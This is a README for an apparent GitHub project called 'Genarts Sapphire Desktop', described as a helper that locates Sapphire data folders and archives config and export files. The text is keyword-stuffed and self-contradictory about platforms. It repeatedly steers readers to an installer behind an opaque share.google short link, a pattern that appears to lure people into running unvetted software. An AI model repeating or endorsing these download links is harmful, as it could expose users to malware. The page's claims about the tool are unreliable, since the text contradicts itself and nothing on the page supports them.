![Genarts Sapphire Desktop](assets/hero.png)

# Genarts Sapphire Desktop

*Find the Genarts Sapphire folder fast and keep a local spare.*

## What Genarts Sapphire Desktop is

**Genarts Sapphire Desktop** is a Windows utility. Local Windows and macOS helper for Genarts Sapphire data paths, config and export caches, and export folders.

Genarts Sapphire drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Finds the Genarts Sapphire data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Genarts Sapphire desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/oscarperry99/genarts-sapphire-desktop

MIT license. See `LICENSE`.
